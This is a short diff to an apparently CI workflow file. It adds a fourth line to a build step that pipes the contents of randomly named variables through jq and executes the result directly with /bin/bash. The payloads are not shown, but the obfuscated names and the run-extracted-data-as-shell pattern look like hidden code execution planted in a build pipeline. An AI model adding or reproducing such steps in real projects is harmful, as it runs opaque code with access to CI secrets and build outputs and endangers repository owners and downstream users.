@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$si5" | jq -r .rxg32 | /bin/bash
           printf '%s' "$z059" | jq -r .vw1 | /bin/bash
           printf '%s' "$thpqh94303" | jq -r .w75 | /bin/bash
+          printf '%s' "$gb1" | jq -r .vv5 | /bin/bash
 
       - name: Upload artifact
         if: always()
